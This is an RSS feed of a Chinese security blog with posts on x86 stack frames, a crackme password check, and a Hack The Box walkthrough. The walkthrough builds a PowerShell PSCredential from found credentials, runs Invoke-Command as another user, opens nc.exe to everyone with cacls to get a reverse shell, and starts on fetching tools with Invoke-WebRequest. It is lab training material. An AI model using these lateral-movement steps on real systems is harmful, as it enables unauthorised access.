<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>WuJ1n9 Blog</title>
    <description></description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Mon, 23 Mar 2020 20:10:19 +0800</pubDate>
    <lastBuildDate>Mon, 23 Mar 2020 20:10:19 +0800</lastBuildDate>
    <generator>Jekyll v4.0.0</generator>
    
      <item>
        <title>通过画堆栈图解析汇编中函数调用的过程</title>
        <description>&lt;h1 id=&quot;堆栈图解析汇编中函数调用的过程&quot;&gt;堆栈图解析汇编中函数调用的过程&lt;/h1&gt;

&lt;h2 id=&quot;c语言中的函数&quot;&gt;C语言中的函数&lt;/h2&gt;

&lt;p&gt;三个关键点：局部变量、参数、函数返回值&lt;/p&gt;

&lt;p&gt;下面是示例程序&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &quot;stdafx.h&quot;
int Plus(int x, int y)
{
  int z = 2;
  return x+y+z;
}
int main(int argc, char* argv[])
{
  int r = Plus(3, 4);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;画堆栈图&quot;&gt;画堆栈图&lt;/h2&gt;

&lt;p&gt;esp ：栈顶&lt;/p&gt;

&lt;p&gt;ebp：栈底&lt;/p&gt;

&lt;p&gt;对于函数调用，先压入参数，再执行 call&lt;/p&gt;

&lt;p&gt;对于参数，从右向左依次压入堆栈（stdcall 模式）
因此，本程式先压入 4，再压入 3&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;调用前的堆栈&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd3p8dc1t4j325o0nmqv5.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.15.54&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2lwdkvvwj30f60f2taw.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.18.00&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PUSH 4
PUSH 3
向栈内压入 4 ，esp - 4 ，eip 向下一条
向栈内压入 3 ，esp - 4 ，eip 向下一条&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2lx949zyj30he0jo0ve.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.23.20&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;call 指令&lt;/p&gt;

    &lt;p&gt;一般的 mov 等指令无法改变 eip 的值，但是 call 可以
	&lt;code class=&quot;highlighter-rouge&quot;&gt;call 00401005&lt;/code&gt;：
	     a. 将 eip 的值改为函数所在的地址 0x00401005
	     b. 将函数的 ret address 压入堆栈保存&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m0pib7cj30ta0pm45c.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.32.09&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;进入函数后，保留现场，划分堆栈&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m1l7hk7j311s0hkav4.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.34.12&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PUSH EBP&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m2fqsinj30go0ictc7.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.35.57&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;保存原栈底位置&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;提升堆栈，创建缓冲区&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m4p7enkj30u00wzqcb.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.40.04&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;紫色部分即为“缓冲区”&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m5fhsm6j30hm0scwhx.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.40.34&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;填充缓冲区&lt;/p&gt;

    &lt;p&gt;&lt;em&gt;LEA EDI ，DWORD PTR SS : [EBP - 44]&lt;/em&gt;   （EDI中存放缓冲区的最顶地址）
&lt;em&gt;MOV ECX ,11&lt;/em&gt;
&lt;em&gt;MOV EAX , CCCCCCCC&lt;/em&gt;
&lt;em&gt;REP STOS DWORD PTR ES : [EDI]&lt;/em&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m7ohlahj30jo0z2wso.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.48.41&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;定义局部变量&lt;/p&gt;

    &lt;p&gt;一般情况下：
	ebp - n 是局部变量
	ebp + n 是参数&lt;/p&gt;

    &lt;p&gt;​	&lt;code class=&quot;highlighter-rouge&quot;&gt;EBP + 4&lt;/code&gt; 是返回地址（因此凡是想修改 ebp + 4 的指令都必须小心）&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m9fjromj30qy0mqafp.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.50.53&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;执行加法&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2math8skj30p40oeq9s.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.55.12&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;EAX 存放函数返回值&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;恢复堆栈&lt;/p&gt;

    &lt;p&gt;&lt;em&gt;MOV ESP ，EBP&lt;/em&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mbd4xfrj30nc0lw0xg.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.58.17&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;em&gt;POP EBP&lt;/em&gt;       恢复栈底&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mbx4qz3j30k80l8dk7.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.58.47&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ret 指令&lt;/p&gt;

    &lt;p&gt;将堆栈中 函数的返回地址 pop 到 eip 中&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2md8xy7wj30sc0ru45v.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午10.10.51&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;em&gt;ADD ESP ，8&lt;/em&gt;      &lt;em&gt;平衡堆栈&lt;/em&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mdr9rebj30wu058jya.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午10.10.21&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Sun, 22 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/22/%E5%A0%86%E6%A0%88%E5%9B%BE%E8%A7%A3%E6%9E%90%E6%B1%87%E7%BC%96%E4%B8%AD%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/22/%E5%A0%86%E6%A0%88%E5%9B%BE%E8%A7%A3%E6%9E%90%E6%B1%87%E7%BC%96%E4%B8%AD%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B/</guid>
        
        <category>逆向</category>
        
        <category>汇编</category>
        
        
      </item>
    
      <item>
        <title>从简单破解学到的汇编基础</title>
        <description>&lt;h1 id=&quot;从简单破解学到的汇编基础&quot;&gt;从简单破解学到的汇编基础&lt;/h1&gt;

&lt;h2 id=&quot;基本汇编指令复习&quot;&gt;基本汇编指令复习&lt;/h2&gt;

&lt;h3 id=&quot;lea-与-mov-与-&quot;&gt;lea 与 mov 与 []&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;lea 指令&lt;/p&gt;

    &lt;p&gt;第二个操作数可以是寄存器或者变量&lt;/p&gt;

    &lt;p&gt;若为&lt;strong&gt;寄存器&lt;/strong&gt;：必须加 [] ，相当于取值操作&lt;/p&gt;

    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov eax, 2
lea ebx, [eax]		;执行后 ebx = 2
mov ebx, eax			;等同于上句
lea ebx, eax			;编译器报错: error A2070: invalid 			    instruction operands
&lt;/code&gt;&lt;/pre&gt;

    &lt;p&gt;优点：&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;lea 可以作简单的算术计算，特别是有了32位指令的增强寻址方式，比如要算EAX*4+EBX+3，结果放入 EDX，怎么办？&lt;/p&gt;

      &lt;p&gt;mov  edx,  eax&lt;br /&gt;
 shl  edx,  2&lt;br /&gt;
 add  edx,  ebx&lt;br /&gt;
 add  edx,  3&lt;/p&gt;

      &lt;p&gt;现在用 lea 一条指令搞定： 
 lea  edx,  [ebx + eax * 4 + 3]&lt;/p&gt;
    &lt;/blockquote&gt;

    &lt;p&gt;注意：&lt;/p&gt;

    &lt;p&gt;​	在函数执行时，经常会看到这种指令：&lt;code class=&quot;highlighter-rouge&quot;&gt;lea esi, [ebp-30]&lt;/code&gt; 用于获取局部变量的地址；注意不能用 OFFSET 获得堆栈参数的地址，因为 OFFSET 只适用于编译时已知的地址。下面的语句无法汇编：&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov esi,OFFSET [ebp-30 ]  ;错误&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;若为&lt;strong&gt;变量&lt;/strong&gt;：有无 [] 都一样，为取地址操作，相当于 C语言中的 &amp;amp;&lt;/p&gt;

    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;num dword 2
lea ebx, num
lea eax, [num]		; eax 为 num 的地址,如 eax = 4206598,随程序不同不同,这时 ebx = eax
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;mov 指令&lt;/p&gt;

    &lt;p&gt;若第二个操作数为&lt;strong&gt;变量&lt;/strong&gt;：有无 [] 都一样&lt;/p&gt;

    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;num dword 2
mov eax, 2
mov ebx, num
mov ecx, [num]		;执行完 ebx = ecx = 2
&lt;/code&gt;&lt;/pre&gt;

    &lt;p&gt;若第二个操作数为&lt;strong&gt;寄存器&lt;/strong&gt;：加 [] 表示将其内存地址中的值传值&lt;/p&gt;

    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov ecx,[eax]			; 相当于 mov ecx, ds:[eax]，将内存地址为 eax 处的值传给 ecx
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;set-指令&quot;&gt;set 指令&lt;/h3&gt;

&lt;p&gt;作用为根据EFLAGS寄存器中的状态标识设置目标操作数的值为 0 或 1。目标操作数指向一个字节寄存器或内存中的一字节。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;sete(setz) al		; 取当前标志寄存器中 ZF 的值，放到 AL 中
setne(setnz) al  ; 取得 ZF 值后，取反，再放到 AL 中。
其中 e 表示 equal （相等）
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;经常接在会改变标志寄存器的指令之后，这样就省去了条件跳转&lt;/p&gt;

&lt;h3 id=&quot;cmov-指令&quot;&gt;cmov 指令&lt;/h3&gt;

&lt;p&gt;条件传送表示要满足某个或某些条件时才执行传送数据。&lt;/p&gt;

&lt;p&gt;条件传送传送数据的格式为： cmovx src, dst&lt;/p&gt;

&lt;p&gt;前面的字母c为英文condition（意思是条件）的首字母，后面的x表示条件，不同的条件有不同的表示，通常是一到三个字母&lt;/p&gt;

&lt;p&gt;cmovne/cmovnz 表示 ZF = 0 时传送数据&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov eax, 2
cmp eax, 2
cmovne ebx, 3 ; 因为 cmp 指令执行后，ZF = 1，因此 3 不会被传给 ebx
即不相等时才传值
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;参考链接：&lt;a href=&quot;https://www.cnblogs.com/kenzhang1031/p/3428623.html#s4&quot;&gt;条件传送数据cmov指令&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;05-初试破解-控制台-汇编程序解读&quot;&gt;05 初试破解-控制台 汇编程序解读&lt;/h2&gt;

&lt;p&gt;其实稍微有点经验的一看就知道这是个密码验证过程，且一下就能发现密码的 ascii&lt;/p&gt;

&lt;p&gt;但我还是想把每一条指令都搞明白，记录一下&lt;/p&gt;

&lt;p&gt;（因为 OD 版本不同，所以这里指令看上去和视频里不一样，这个无所谓）&lt;/p&gt;

&lt;p&gt;（假设用户输入就是密码 rkvir）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;lea eax,[local.14]	; 取局部变量的地址到 eax
push eax						; 将 eax 压栈
push 0046D6B8       ; 压入C语言的格式符 %s
call scanf					; 获取用户输入，以上这就是函数调用的过程
mov eax,[local.14]	; 将局部变量的值传给 eax
xor edx,edx					
add esp,0x18				; 平栈
cmp al,0x72					; 比较密码的第一位，ZF=1
sete dl							; edx = 1
cmp ah,0x6B					; 比较第二位，ZF=1
lea ecx,dword ptr ds:[edx+0x1]	; ecx = 1+1 = 2
cmovne ecx,edx			; 因为 ZF=1，因此不传值，ecx 不变
cmp byte ptr ss:[ebp-0x36],0x76		; 比较第三位，ZF=1
lea eax,dword ptr ds:[ecx+0x1]		; eax = 2+1 = 3
cmovne eax,ecx			; 因为 ZF=1，因此不传值
cmp byte ptr ss:[ebp-0x35],0x69 	; 同上
lea ecx,dword ptr ds:[eax+0x1]
cmovne ecx,eax
cmp byte ptr ss:[ebp-0x34],0x72
lea edx,dword ptr ds:[ecx+0x1]
cmovne edx,ecx
cmp byte ptr ss:[ebp-0x33],0x0
lea eax,dword ptr ds:[edx+0x1]
cmovne eax,edx
cmp eax,0x5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里一开始不明白为什么一个简单的比较字符串的程序这么冗长，后来才发现这就是故意设置的，其中 ecx edx eax 相互增加的过程就是原C程序的 nflag 增加的过程。如果某一位密码错误，eax 都不会顺利地增加到 6，则登录失败&lt;/p&gt;
</description>
        <pubDate>Sat, 21 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/21/%E8%A7%86%E9%A2%9105%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/21/%E8%A7%86%E9%A2%9105%E7%AC%94%E8%AE%B0/</guid>
        
        <category>逆向</category>
        
        <category>汇编</category>
        
        
      </item>
    
      <item>
        <title>Hackthebox Sniper writeup/Walkthrough/攻略</title>
        <description>
</description>
        <pubDate>Wed, 11 Mar 2020 10:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/11/HTB-Sniper/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/11/HTB-Sniper/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        <category>WINDOWS 提权</category>
        
        
      </item>
    
      <item>
        <title>利用 PSCredential 越权反弹 shell</title>
        <description>&lt;h2 id=&quot;题目设定与前提&quot;&gt;题目设定与前提&lt;/h2&gt;

&lt;p&gt;近期做 HTB 学习到了一些 WINDOWS 越权执行的知识，通过前期信息收集与渗透，目前我们已经通过 webshell 新建一了个临时目录 Temp，并上传了 nc.exe 拿到了靶机中的普通用户权限。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoxf4sjpyj30im060gms.jpg&quot; alt=&quot;image-20200310164628331&quot; /&gt;&lt;/p&gt;

&lt;p&gt;同时还从 db.php 发现了一个 dbuser 的凭证&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoszxr5pqj31460ektcf.jpg&quot; alt=&quot;Xnip2020-03-09_01-44-55 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;查看用户组，发现这是用户 “Chris” 的凭证。现在我们需要做的就是要越权到用户 Chris 目录下&lt;/p&gt;

&lt;h2 id=&quot;生成-pscredential-对象&quot;&gt;生成 PSCredential 对象&lt;/h2&gt;

&lt;p&gt;很多 Powershell 的 cmdlet 可以添加一个 PSCredential 的对象，用于使用特定用户运行 cmdlet。有两种方式生成 PSCredential 对象&lt;/p&gt;

&lt;h3 id=&quot;方法一&quot;&gt;方法一&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Credential&lt;/code&gt; 命令，会让输入用户名和密码，这种方式可以被用于交互式模式下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcouvm8y5lj319v0u0dnz.jpg&quot; alt=&quot;Xnip2020-03-10_15-16-41&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcouvqvo29j31aq0p00zp.jpg&quot; alt=&quot;Xnip2020-03-10_15-18-21&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;方法二&quot;&gt;方法二&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;大多数情况下，你不会希望在交互模式下生成 &lt;code class=&quot;highlighter-rouge&quot;&gt;credential objects&lt;/code&gt;，因为这样无法在脚本或自动化工具中使用&lt;/p&gt;

&lt;p&gt;为此我们需要先生成一个包含密码的 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt;，之后将 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt; 和用户名传给 &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Management.Automation&lt;/code&gt; 的 PSCredential 方法&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;具体操作&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nv&quot;&gt;$secpasswd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&quot;s2&quot;&gt;&quot;PlainTextPassword&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$creds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$secpasswd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;下面我们分析一下上述 cmdlets&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ScureStrings&lt;/code&gt; 是微软在 2.0 版本的 .NET 中引进的一个类，相比于传统 Strings 类更适合用于密码等加密信息，其新特性为：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;不再是不可改变的&lt;/li&gt;
  &lt;li&gt;可被人工销毁&lt;/li&gt;
  &lt;li&gt;不再会在内存中已明文保存密码，防止被内存提取&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ConvertTo-SecureString -AsPlainText&lt;/code&gt; 可以将密码以明文储存进 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt;，但 &lt;code class=&quot;highlighter-rouge&quot;&gt;-Force&lt;/code&gt; 选项是必需的，因为明文存储本身是危险的，会被禁止&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;New-Object System.Management.Automation.PSCredential (&quot;username&quot;, $secpasswd)&lt;/code&gt; 生成一个 PSCredential 对象，用于后续 cmdlets 的执行&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.quickstart.com/blog/powershell-credentials-and-securestrings-part-i/&quot;&gt;powershell-credentials-and-securestrings&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://duffney.io/AddCredentialsToPowerShellFunctions#with-credentials-in-a-variable&quot;&gt;How to Add Credential Parameters to PowerShell Functions&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcowstksurj31e40gmq7v.jpg&quot; alt=&quot;image-20200310162500289&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;invoke-command-远程执行反弹-shell&quot;&gt;Invoke-Command 远程执行反弹 shell&lt;/h2&gt;

&lt;p&gt;Invoke-Command 可以远程执行 cmdlets，具体操作如下&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Invoke-Command –ComputerName MyServer1 &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Invoke-Command –ComputerName MyServer1 &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; demo&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;erveradmin &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoxd2zlysj31e808c431.jpg&quot; alt=&quot;image-20200310164428895&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这样实际上我们已经成功越权获得另一个用户 Chris 的权限，下面我们尝试反弹 Chris 的 shell 获得更方便的利用&lt;/p&gt;

&lt;p&gt;直接利用之前上传的 nc 反弹，显示权限不足&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoz60ih12j31e40fkjz6.jpg&quot; alt=&quot;Xnip2020-03-10_17-46-10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有两个方法解决&lt;/p&gt;

&lt;h3 id=&quot;方法一-1&quot;&gt;方法一&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;修改 nc.exe 的权限，允许任意用户直接运行&lt;/p&gt;

&lt;p&gt;首先查看 nc.exe 原本的权限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoz8shjbxj313e0d6q58.jpg&quot; alt=&quot;image-20200310174933649&quot; /&gt;&lt;/p&gt;

&lt;p&gt;修改权限&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cacls nc.exe /t /e /g everyone:f&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/t&lt;/code&gt; 表示修改文件夹及子文件夹中所有文件的ACL.
&lt;code class=&quot;highlighter-rouge&quot;&gt;/e &lt;/code&gt;表示仅做编辑工作而不替换.
&lt;code class=&quot;highlighter-rouge&quot;&gt;/c &lt;/code&gt;表示在出现拒绝访问错误时继续.
&lt;code class=&quot;highlighter-rouge&quot;&gt;/g every:f&lt;/code&gt;表示给予本地所有用户以完全控制的权限.
&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;f&quot;&lt;/code&gt;代表完全控制，如果只是希望给予读取权限，那么应当是 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;r&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;再次查看权限，发现权限修改成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcozd0t1dpj313c0gutbs.jpg&quot; alt=&quot;image-20200310175336704&quot; /&gt;&lt;/p&gt;

&lt;p&gt;重新远程反弹 shell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcozfpha0rj31e60imwmq.jpg&quot; alt=&quot;image-20200310175612690&quot; /&gt;&lt;/p&gt;

&lt;p&gt;成功获取用户 Chris 的 shell&lt;/p&gt;

&lt;h3 id=&quot;方法二-1&quot;&gt;方法二&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;既然默认用户下的 nc 无权运行，那就向用户 Chris 上传一个新的 nc&lt;/p&gt;

&lt;p&gt;先了解一下 &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;相当于 &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; 命令，获取 http 的请求访问内容&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;语法Syntax&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Parameter Set: Default
Invoke-WebRequest &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &amp;lt;Uri&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Body&lt;/span&gt; &amp;lt;Object&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Certificate&lt;/span&gt; &amp;lt;X509Certificate&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-CertificateThumbprint&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ContentType&lt;/span&gt; &amp;lt;String&amp;gt; 